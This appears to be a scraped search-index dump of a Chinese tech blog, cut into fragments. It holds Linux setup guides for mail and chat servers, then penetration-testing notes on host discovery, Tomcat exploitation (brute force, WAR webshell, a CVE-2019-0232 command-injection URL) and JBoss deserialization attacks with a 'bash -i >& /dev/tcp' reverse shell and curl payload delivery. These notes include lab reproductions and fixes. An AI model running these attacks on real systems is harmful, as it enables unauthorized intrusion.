ALL PRIVILEGES ON postfix_db.* TO 'post_user'@'localhost' FLUSH PRIVILEGES; Postfixadmin 数据库连接文件 cd /opt/postfixadmin/ \u0026\u0026 cp config.inc.php config.local.php sudo vim config.local.php $CONF['configured'] = true; $CONF['default_language'] = 'cn'; # 数据库连接信息 $CONF['database_type'] = 'mysqli'; $CONF['database_host'] = 'localhost'; $CONF['database_password'] = '1234'; $CONF['database_name'] = 'postfix_db' 4.创建临时目录 mkdir /opt/postfixadmin/templates_c \u0026\u0026 chmod 755 -R /opt/postfixadmin/templates_c chown -R www-data:www-data /opt/postfixadmin/templates_c 5.WEB安装阶段 # 访问前面设置的url和文件 http://mail.qq.com/setup.php 设置 setup password 生成 setup password 的hash值，复制下来，添加到服务端中配置项 # vim config.local.php $['setup_password'] = 'xxxxxxx hash xxxxxxxx' 然后创建管理员账号与密码 登录管理员账号 创建虚拟域、邮箱账号 域名清单 – 新建域 虚拟用户清单 – 新建邮箱（别名） 6.集成Postfix 以下命令以root权限运行 apt install Postfix Postfix-mysql sasl2-bin # sasl来实现身份认证 配置sasl自动启动 # vim /etc/default/saslauthd START=yes systemctl restart saslauthd.service 邮箱目录、访问账号、组 # 添加组账号vmail groupadd -g 5000 vmail \u0026\u0026 mkdir -p /var/mail/vmail # 创建账号vmail, 属于组vmail useradd -u 5000 vmail -s /usr/sbin/nologin -d /var/mail/vmail chown -R vmail:vmail /var/mail/vmail 7.数据库配置(3个) 数据库配置文件1 mkdir -p /etc/postfix/sql # 去数据库中找虚拟域的域名 vim /etc/postfix/sql/mysql_virtual_domains_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT domain FROM domain WHERE domain='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_domains_maps.cf # 使用上面配置的配置文件,来查询虚拟域 postmap -q qq.com mysql:/etc/postfix/sql/mysql_virtul_domains_maps.cf # 验证 数据库配置文件2 # 查邮箱 vim /etc/postfix/sql/mysql_virtual_mailbox_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT maildir FROM mailbox WHERE username='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e virtual_mailbox_domains=mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # 使用上面配置的配置文件 postmap -q tom@qq.com mysql:/etc/postfix/sql/mysql_virtual_mailbox_maps.cf # 验证 数据库配置文件3 # 查别名 vim /etc/postfix/sql/mysql_virtual_alias_maps.cf user = post_user password = 1234 hosts = 127.0.0.1 dbname = postfix_db query = SELECT goto FROM alias WHERE address='%s' AND active='1' # 想要生效，配置加入 /etc/postfix/main.cf postconf -e mysql_virtual_alias_maps=mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # 使用上面配置的配置文件 postmap -q abuse@qq.com mysql:/etc/postfix/sql/mysql_virtual_alias_maps.cf # 验证 权限，属主 chgrp postfix /etc/postfix/sql/mysql_* 至此，postfixadmin与postfix MTA安装完成 8.启用SASL 强制 Postfi","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:4:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"Web MAIL安装 各大邮件服务商全部提供Web Mail 基于浏览器的统一使用体验（无序配置客户端） Roundcube – 一款非常流行且稳定的Web Mail应用 1.安装依赖包（可选） apt install php7.2-intl php-imagick php7.2-ldap 2.下载Roundcube cd /var/www/html \u0026\u0026 wget https://github.com/roundcube/roundcubemail/releases/download/1.4.7/roundcubemail-1.4.7-complete.tar.gz tar -xvf roundcubemail-1.4.7-complete.tar.gz mv roundcubemail-1.4.7-complete webmail \u0026\u0026 cd webmail 3.创建数据库 CREATE DATABASE roundcubedb; CREATE DATABASE routecubemail; CREATE USER 'roundcube'@'localhost' IDENTIFIED BY '1234'; GRANT ALL PRIVILEGES ON roundcubedb.* 'roundcube'@'loocalhost'; GRANT ALL PRIVILEGES ON routecubemail.* 'roundcube'@'loocalhost'; FLUSH PRIVILEGES; 导入数据 # 当前目录下的SQL文件夹下的sql文件（针对不同类型的数据库进行导入） mysql -u roundcube -p roundcubedb \u003c SQL/mysql.initial.sql 4.配置站点文件 # 这里使用默认的配置文件 vim /etc/nginx/sites-avaialable/default location /webmail { root /var/www/html;s index index.php; location ~ ^/webmaik/(.+\\.php)$ { root /var/www/html; try files $uri=404; fastcgi_index index.php; fastcgi_pass unix:/run/php/php7.2-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root $fastcgi_script_name; include /etc/nginx/fastcgi_params; } location ~ ^/webmail/(README|INSTALL|LICENSE|CHANGELOG|UPGRADING)$ { deny all; } location ~ ^/webmail/(bin|SQL|config|temp|logs)/ { deny all; } } 检查配置 nginx -t 重启服务 systemctl restart nginx 5.权限 chown -R www-data:www-data /var/www/html/webmail chmod 755 /var/www/html/webmail/temp /var/www/html/webmail/logs 6.Web安装阶段 # 访问路径 http://mail.qq.com/webmail/installer ## 检查环境 # 一些组件可能没安装，可以安装 apt install php-dompdf apt install php7.2-xml ## 创建配置文件 ... # IP检查 # 设置数据库密码 # managesieve # ...具体的自己看配置 ## 初始化数据库 删除installer目录 登录Web Mail ## 访问web界面 http://mail.qq.com/webmail ","date":"2020-07-11","objectID":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/:5:0","tags":["邮件服务","ubuntu server"],"title":"ubuntu sever-邮件服务","uri":"/ubuntu-server-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1/"},{"categories":["Linux"],"content":"聊天服务与IRC服务 沟通是最重要的问题 发明网络的目的的沟通(信息交换) 高效的沟通是生产力 为什么不用QQ、微信、Telegram？ 企业信息流经他人服务器（泄密） 内部信息内部传递效率更高 更专注于公司内部工作内容 IRC Internet Relay Chat（因特网中继聊天） 是一种通过网络的群体即时聊天方式（也可以用于个人间聊天） 公开的协议（TCP和SSL协议） IRC服务器可以连接其他的IRC服务器形成一个IRC网络 大多数的IRC服务器不需要客户注册登录 目前已经很少见（黑客和老牌的技术群体的挚爱） 部分流服务商依赖IRC协议进行信息传递 IRC服务器的搭建 Ircd-Hybrid为例 安装配置简单 系统资源占用低 1.安装 # 安装服务端 sudo apt install ircd-hybrid 2.管理员口令(operator) # 设置管理员的密码（加密的方式保存密文） mkpaswd pass123 # 生成密文，一会在后面用 3.配置 # sudo vim /etc/ircd-hybrid/ircd.conf serverinfo { name = \"irc.lab.com\" description = \"LAB Campany IRC Server\" network_name = \"This is my Beijing Office IRC Network\" # 其他配置项... } operator { # 管理员的片段（默认是注释的） name = \"admin\" user = \"*@*\"; # 限制可以连接的用户和ip地址，这里是所有用户所有主机 password = \"xxxxxx\" # 上面mkpaswd pass123 生成的密文 } # 后面根据需要配置 4.Banner sudo vim /etc/ircd-hybrid/ircd.motd # 客户端登录信息的信息 5.重启服务 sudo systemctl restart ircd-hybrid.service 6.客户端 - mIRC # Win下的一款商业软件 - irssi # Linux下常用 # 安装 sudo apt install irssi sudo apt install ident2 # 服务端才能访问该客户端的计算机名等信息 # 客户端直接连接服务端就行 irssi -c 192.168.175.130 # 服务端口，默认 666x 7.客户端基本命令 /help # 查看所有命令 /help channel /opera admin pass123 /channel list # 查看频道 /channel add -auto #Football # 添加频道 /join #Football # 加入指定的聊天室 # 把自己提升为管理员身份 /oper admin pass123 ","date":"2020-07-08","objectID":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/:1:0","tags":["聊天服务","ubuntu server"],"title":"ubuntu sever-聊天服务","uri":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"},{"categories":["Linux"],"content":"MatterMost服务搭建 irssi这种命令行的方式并不是很友好，MatterMost使用十分友好 团队群聊SaaS平台 Go语言开发 独立与操作系统的二进制部署方案(它已经给打包好了) 基于MySQL、Postgresql数据库 Slack(收费)的替代选择方案(兼容Slack，二者可进行通信) 全平台客户端支持（Web） 免费版、收费版 适用于企业内部团队文件共享和信息交换 服务端：https://github.com/mattermost/mattermost-server 客户端程序：https://github.com/mattermost/desktop Web界面的：https://github.com/mattermost/mattermost-webapp 安装部署 1.安装数据库 # 这里以mysql为例 sudo apt install mysql-server sudo mysql_secure_installation 2.建库 create user 'muser'@'%' identified by '12345678'; create database mattermost; grant all privileges on mattermost.* to'muser'@'%'; -- GRANT ALTER,CREATE,DELETE,DROP,INDEX,INSERT,SELECT,UPDATE ON mattermost.* to'muser'@'%'; flush privileges; 3.下载mattermost wget https://releases.mattermost.com/5.24.2/mattermost-5.24.2-linux-amd64.tar.gz tar -zxvf mattermost*.gz sudo mv mattermost /opt # 个人安装的软件包，一般会放到opt下面 sudo mkdir /opt/mattermost/data cd /opt 4.权限设置 sudo useradd -rU mattermost sudo chown -R mattermost:mattermost /opt/mattermost sudo chmod -R g+w /opt/mattermost 5.配置文件 # sudo vim /opt/mattermost/config/config.json # 这里配置数据库项， mattermost库的名字 \"DriverName\": \"mysql\" \"DataSource\": \"muser:passw123@tcp(localhost:3360)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s\" 6.测试数据库连接 sudo -u mattermost /opt/mattermost/bin/mattermost # 重点关注端口是否正常开启，一般默认为8065端口 7.Systemd 服务单元文件 # mattermost本身是不带service的，所以我们可以手动创建 sudo touch /lib/system/mattermost.service # 添加内容... 8.中文字体 # sudo vim /opt/mattermost/config/config.json \"DefaultServerLocale\": \"zh-CN\" \"DefaultClientLocale\": \"zh-CN\" \"AvailableLocale\": \"zh-CN\" 9.启动服务 sudo systemctl daemon-reload # 修改完再启动服务 sudo systemctl start mattermost.service sudo systemctl enable mattermost.service # 然后查看服务 sudo systemctl status mattermost.service 10.Web配置 # 域名根据自己的来，或ip也行 https://chat.lab.com:8065 # 首个账号被赋予system_admin角色（管理员） 建议：先建立一个团队(相当于一个聊天室) 然后可以根据提示下载客户端 11.系统控制台配置 常规-\u003e服务端口(先指定页面上的命令，再在web界面修改)，证书，地址，data存储目录(本地存储/云存储),电子邮件通知 sudo setcap_net_bind_service=+ep./bin/mattermost # 修改服务端口 12.使用 # 别人进来的方式： 1.邀请链接 2.单独添加成员 # 客户端： - Web版 - 其他操作系统客户端 # 支持其他插件，可以与第三方软件集成使用 文件的传送，共享文件，置顶文件 ","date":"2020-07-08","objectID":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/:2:0","tags":["聊天服务","ubuntu server"],"title":"ubuntu sever-聊天服务","uri":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"},{"categories":["Linux"],"content":"Openfire服务搭建 开源免费的IM即时通信服务器 Real-time collaboration(RTC) 由java开发，需要java运行环境 使用拓展通讯和表示协议（XMPP）Extensible Messaging and Presence Protocol 号称单台服务器可支持上万并发用户 兼容所有支持XMPP协议的客户端(spark),不建议web的方式(基于flash) 支持插件开发 支持mysql、postgrersql、内建数据库 支持LDAP、TLS、群集部署 搭建服务端 1.java环境 sudo apt-get install openjdk-8-jdk java -version 2.数据库 # 这里以mysql为例 sudo apt install mysql-server sudo mysql_secure_installation 3.建库 create database openfire; grant all privileges on openfire.* to'fireuser'@'%' identified by 'pass123'; flush privileges; 4.下载，安装 # http://www.igniterealtime.org/downloads/index.jsp#openfire sudo dpkg -i openfire.deb 5.导入数据库表 sudo mysql; show databases; use openfire; source /usr/share/openfire/resources/databases/openfire_mysql.sql show tables; 6.Web界面配置 ## http://openfire.lab.com:9090 #进行常用配置 #数据库URL路径： 地址:端口:库名 jdbc:mysql://127.0.0.1/openfire?useUnicode=true\u0026chasacterEncoding=UTF-8\u0026characterSetResults=UTF-8\u0026rewriteBatchedStatements=true # 通过Web进入管理界面 7.创建用户账号 客户端 可以使用spark http://www.igniterealtime.org/downloads/index.jsp#openfire 客户端登录忽略证书爆粗平 spark使用5222端口连接服务端 ","date":"2020-07-08","objectID":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/:3:0","tags":["聊天服务","ubuntu server"],"title":"ubuntu sever-聊天服务","uri":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"},{"categories":["Linux"],"content":"Rochet Chat服务搭建 与Mattermost类似 团队群聊SaaS平台 Slack的替代选择方案 全平台客户端支持(WEB) 适用于企业内部文件共享和信息交换 独立于操作系统的Snap部署方式 安装 安装异常简单 F1.自动安装 # 推荐 sudo snap install rocketchat-server F2.手动安装 1.安装数据库 sudo apt install mongodb 2.安装依赖 sudo apt install node.js build-essential npm 3.指定Node.js版本 sudo npm install -g n sudo n 8.9.3 # 这里的版本自己查看一下目前支持的版本号 4.下载服务端源码，并安装 # 下载地址： https://releases.rocket.chat/latest/download tar -zxcf xxx.tgz cd bundle/programs/server npm install cd ../ export ROOT_URL=http://1.1.1.1：3000/ export MONGO_URL=mongodb://localhost:27017/rocketchat export PORT=3000 node main.js # 启动服务端程序 5.访问Web页面 # 向导页面 创建账号等配置（第一个账号是管理员） 6.用户访问3000的地址，可以注册账号，加入聊天等 7.配置数据库集群（自己查，生产环境建议配置） 生产环境数据库复制集群 Note：数据库建议使用单独的服务器 ","date":"2020-07-08","objectID":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/:4:0","tags":["聊天服务","ubuntu server"],"title":"ubuntu sever-聊天服务","uri":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"},{"categories":["Linux"],"content":"系统中文显示 此为补充知识点 # 先安装中文语言包 sudo apt install language-pack-zh-hans locale -a # 配置中文语言环境变量 vim /etc/environment LANG=\"zh_CN.UTF-8\" LANGUAGE=\"zh_CN:zh:en_US:en\" # 配置中文，英文还是会继续使用的 ","date":"2020-07-08","objectID":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/:5:0","tags":["聊天服务","ubuntu server"],"title":"ubuntu sever-聊天服务","uri":"/ubuntu-sever-%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"},{"categories":["渗透测试"],"content":"基于UDP发现内网存活主机 UDP显著特性: 1.UDP 缺乏可靠性。UDP 本身不提供确认,超时重传等机制。UDP 数据报可能在网络中被复制,被重新排序,也不保证每个数据报只到达一次。 2.UDP 数据报是有长度的。每个 UDP 数据报都有长度,如果一个数据报正确地到达目的地,那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议,没有任 何(协议上的)记录边界。 3.UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错,在网络拥塞时,目的端无法接收到大量的UDP数据报 4.UDP 支持多播和广播。 1.nmap扫描 # -sU nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 2.msf扫描 use auxiliary/scanner/discovery/udp_probe # 或这个模块 use auxiliary/scanner/discovery/udp_sweep 3.unicornscan扫描 Linux下推荐 unicornscan -mU 192.168.1.100 4.ScanLine扫描 McAfee出品,win下使用推荐。管理员执行。 项目地址:https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx 网盘地址:http://pan.baidu.com/s/1i4A1wLR 密码:hvyx 自己搜索资源吧 输入sl运行ScanLine 5.在线基于Nmap的udp扫描: 点击链接 基于ARP发现内网存活主机 1.nmap扫描 nmap -sn -PR 192.168.1.1/24 2.msf扫描 use auxiliary/scanner/discovery/arp_sweep ... 3.netdiscover netdiscover -r 192.168.1.0/24 -i wlan0 4.arp-scan(linux) (推荐)速度与快捷 项目地址:https://linux.die.net/man/1/arp-scan arp-scan没有内置kali,需要下载安装。 apt-get install arp-scan arp-scan --interface=wlan0 --localnet 5.Powershell powershell.exe -exec bypass -Command \"Import-Module .\\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24\" 6.arp scannet 项目地址: https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/ 7.arp-scan(windows) (推荐)速度与快捷 项目地址:https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan(非官方) arp-scan.exe -t 192.168.1.1/24 8.arp-ping.exe arp-ping.exe 192.168.1.100 9.其他 如cain的arp发现,一些开源py,pl脚本等,不一 一介绍。 下载的工具，后门自查 基于netbios发现内网存活主机 IBM公司开发,主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以 使用的应用程序编程接口(API),为程序提供了请求低级服务的同一的命令集,作用是为了给局域网提供网络以及其他特殊功能。 系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于 NETBIOS协议获得计算机名称——解析为相应IP地址,实现信息通讯,所以在局域网内部使 用NetBIOS协议可以方便地实现消息通信及资源的共享。 1.nmap扫描 # nbstat.nse nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 2.msf扫描 use auxiliary/scanner/netbios/nbname 3.nbtscan扫描 项目地址: http://www.unixwiz.net/tools/nbtscan.html NBTscan version 1.5.1: https://github.com/scallywag/nbtscan ### Windows nbtscan-1.0.35.exe -m 192.168.1.0/24 nbtscan -n # 推荐 ### Linux （推荐） tar -zxvf ./nbtscan-source-1.0.35.tgz # (其他版本自己寻找) make nbtscan -r 192.168.1.0/24 nbtscan -v -s: 192.168.1.0/24 4.NetBScanner: 项目地址:https://www.nirsoft.net/utils/netbios_scanner.html 基于snmp发现内网存活主机 SNMP协议主要由两大部分构成: SNMP管理站和SNMP代理。 SNMP管理站是一个中心节点,负责收集维护各个SNMP元素的信息,并对这些信息进行处理,最后反馈给网络管理员;而SNMP代理是运行在各个被管理的网络节点之上,负责统计该节点的各项信息,并且负责与SNMP管理站交互,接收并执行管理站的命令,上传各种本地的网络信息 1.nmap扫描 nmap -sU --script snmp-brute 192.168.1.0/24 -T4 2.msf扫描 use auxiliary/scanner/snmp/snmp_enum 3.SMBScan 项目地址:https://www.mcafee.com/us/downloads/free-tools/snscan.aspx 依然是一块macafee出品的攻击 4.NetCrunch 项目地址:https://www.adremsoft.com/demo/ 内网安全审计工具,包含了DNS审计,ping扫描,端口,网络服务等。 5.snmp for pl扫描: 项目地址:https://github.com/dheiland-r7/snmp 其他扫描: 6.snmpbulkwalk 7.snmp-check 8.snmptest 附录 use auxiliary/scanner/snmp/aix_version use auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/arris_dg950 use auxiliary/scanner/snmp/snmp_enum_hp_laserjet use auxiliary/scanner/snmp/brocade_enumhash use auxiliary/scanner/snmp/snmp_enumshares use auxiliary/scanner/snmp/cambium_snmp_loot use auxiliary/scanner/snmp/snmp_enumusers use auxiliary/scanner/snmp/cisco_config_tftp use auxiliary/scanner/snmp/snmp_login use auxiliary/scanner/snmp/cisco_upload_file use auxiliary/scanner/snmp/snmp_set use auxiliary/scanner/snmp/netopia_enum use auxiliary/scanner/snmp/ubee_ddw3611 use auxiliary/scanner/snmp/sbg6580_enum use auxiliary/scanner/snmp/xerox_workcentre_enumusers 其他内网安全审计工具(snmp): 项目地址: https://www.solarwinds.com/topics/snmp-scanner 项目地址: https://www.netscantools.com/nstpro_snmp.html snmp for pl : wget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gz tar xvzf ./NetAddr-IP-4.078.tar.gz cd NetAddr-IP-4.078/ perl Makefile.PL make make install ./snmpbw.pl 基于ICMP发现内网存活主机 1.nmap扫描 nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 nmap ‐sn ‐PE ‐T4 192.168.1.0/24 2.CMD下扫描 for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr \"TTL=\" 3.powershell扫描 # powershell脚本 ./Invoke‐TSPingSweep.ps1 powers","date":"2020-06-07","objectID":"/%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%96%B9%E6%B3%95-%E7%AE%80%E5%8D%95%E6%95%B4%E7%90%86/:0:0","tags":["渗透测试","探测主机存活","内网"],"title":"发现内网存活主机方法-简单整理","uri":"/%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%96%B9%E6%B3%95-%E7%AE%80%E5%8D%95%E6%95%B4%E7%90%86/"},{"categories":["渗透测试"],"content":"后台管理页面弱口令 默认：http://127.0.0.1:8080/manager/html页面只允许本地访问，除非管理员手工修改了这些属性 1.尝试登录后台 1.尝试默认账户密码：tomcat:tomcat 2.如果不是，尝试用弱口令字典进行爆破 # hydra爆破manager后台 hydra -L user.txt -P user.txt -f 10.10.10.81 -s 8080 http-get /manager/html 2.部署war包 # war包生成 jar -cvf xx.war xx.jsp 3.部署后, 访问马 访问 http://127.0.0.1:8080/war 包名(无后缀) / 包名内文件名 4.后续操作 安全检查 查看tomcat日志 tail /root/tomcats/apache-tomcat-xxx/logs/xxxx_log # 如果出现大量401，就可能正在被爆破 查看部署的war包 # 部署路径在tomcat的webapps目录下，进行检查 # 查看部署war包的日志(tomcat的logs下)，是否有部署的痕迹 修复建议 若无必要,取消 manager/html 功能。 若要使用, manager 页面应只允许本地 IP 访问 任意文件写入(CVE-2017-12615) 漏洞本质是 Tomcat 配置文件 /conf/web.xml 配置了可写( readonly=false ),导致我们可以往服务器写文件: 条件： 服务器开启了put方法； 同时tomcat存在后缀解析漏洞 复现 正常状况： 利用成功： 安全检查 查看日志内容，如果方法是PUT， 且状态码为201，就要注意了 防御措施 禁用PUT方法(默认是禁止的，开启REST API的情况下可能会开启 –\u003e 和业务保持沟通) 设置强密码或删除Web控制台，以及示例页面(可能暴露信息)，关闭报错页面提示 将 readonly=true ,默认为 true 远程代码执行(CVE-2019-0232) 影响范围: 9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 , 7.0.0 ~ 7.0.93 影响系统: Windows 环境搭建 手头暂时没windows系统，从网上借鉴了一下 配置Apache Tomcat服务器（修改conf目录配置文件，启用CGI） 1、打开Tomcat安装目录的apache-tomcat-8.5.39\\conf\\web.xml修改如下配置，在默认情况下配置是注释的。 2、打开Tomcat安装目录的apache-tomcat-8.5.39\\conf\\context.xml修改如下配置，添加privileged=“true” 。 3、在apache-tomcat-8.5.39\\webapps\\ROOT\\WEB-INF目录新建一个cgi-bin文件夹，创建一个test.bat的文件，内容随意 漏洞利用 POC # 访问 http://127.0.0.1:8080/cgi-bin/test.bat?\u0026dir # 执行命令 http://127.0.0.1:8080/cgi-bin/test.bat?\u0026C:/WINDOWS/system32/net+user Note: net 命令的路径要写全,直接写 net user , Tomcat 控制台会提示net 不是内部命令,也不是可运行的程序,另 必须使用 + 号连接,使用 空格 ,%2B 都会执 行失败,控制台报错。 文件包含漏洞(CVE-2020-1938) 该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。 受影响版本 Apache Tomcat 6 Apache Tomcat 7 \u003c 7.0.100 Apache Tomcat 8 \u003c 8.5.51 Apache Tomcat 9 \u003c 9.0.31 不受影响版本 Apache Tomcat = 7.0.100 Apache Tomcat = 8.5.51 Apache Tomcat = 9.0.31 文件包含RCE复现 POC： https://github.com/0nise/CVE-2020-1938 https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-Ajp-lfi-POC 利用文章： https://www.cnblogs.com/Rain99-/p/12517660.html https://blog.csdn.net/SouthWind0/article/details/105147369/ 防护措施 更新到安全版本 关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉：\u003cConnector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\" /\u003e 配置ajp配置中的secretRequired跟secret属性来限制认证 参考 https://www.cnvd.org.cn/webinfo/show/5415 ","date":"2020-05-26","objectID":"/tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:0","tags":["渗透测试","tomcat","中间件漏洞"],"title":"Tomcat常见漏洞复现","uri":"/tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"JBoss 5.x/6.x 反序列化漏洞( CVE-2017-12149 ) 验证： 访问/invoker/readonly，如果返回 500 ,说明页面存在,此页面存在反序列化漏洞。 利用工具：JavaDeserH2HC 步骤： 1.先编译 # 我们选择一个 Gadget : ReverseShellCommonsCollectionsHashMap ,编译并生成序列化数据 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 2.设置反弹的IP和端口： java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.105:8888 # ip 是 nc 所在的 ip # 这样就会将序列化对象保存在ReverseShellCommonsCollectionsHashMap.ser中，用curl命令发送到Jboss服务地址 3.本机进行监听 nv -lvvp 8888 4.再打开另一个控制台，运行如下curl命令 curl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser 5.成功反弹shell ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:1","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"JBoss JMXInvokerServlet 反序列化漏洞 验证： 访问 /invoker/JMXInvokerServlet，返回如下,说明接口开放,此接口存在反序列化漏洞。 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 /invoker/JMXInvokerServlet接口中。 也可以直接利用工具检测：工具下载地址 # 运行工具即可 java -jar DeserializeExploit.jar ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:2","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"JBoss EJBInvokerServlet 反序列化漏洞 验证： 访问 /invoker/EJBInvokerServlet 返回如下,说明接口开放,此接口存在反序列化漏洞。 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 /invoker/EJBInvokerServlet 接口中 ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:3","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"修复建议 不需要ttp-invoker.sar组件的用户可直接删除此组件 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中,对 http invoker 组件进行访问控制:\u003curl-pattern\u003e/*\u003c/url-pattern\u003e ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:4","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"JBoss \u003c=4.x JBossMQ JMS 反序列化漏洞( CVE-2017-7504 ) 利用工具：JavaDeserH2HC 步骤： 1.先编译 # 选择ExampleCommonsCollections1WithHashMap，编译并生成序列化数据 javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java #编译 2.设置反弹的IP和端口： java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap \"bash -i \u003e\u0026 /dev/tcp/192.168.0.105/1234 0\u003e\u00261\" #ser全称serialize，序列化恶意数据至文件。 3.本机进行监听 nv -lvvp 1234 4.再打开另一个控制台，运行如下curl命令 #该ser文件作为请求数据主体发送如下数据包 curl http://192.168.0.100:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser # --data-binary 意为以二进制的方式post数据 5.成功反弹shell ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:5","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"JMX Console 未授权访问 漏洞描述 未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。 环境搭建 使用vulhub cd vulhub/jboss/CVE-2017-7504/ docker-compose up -d # 浏览器访问 复现 1.未授权访问测试（无无需认证进入入控制⻚页面面） 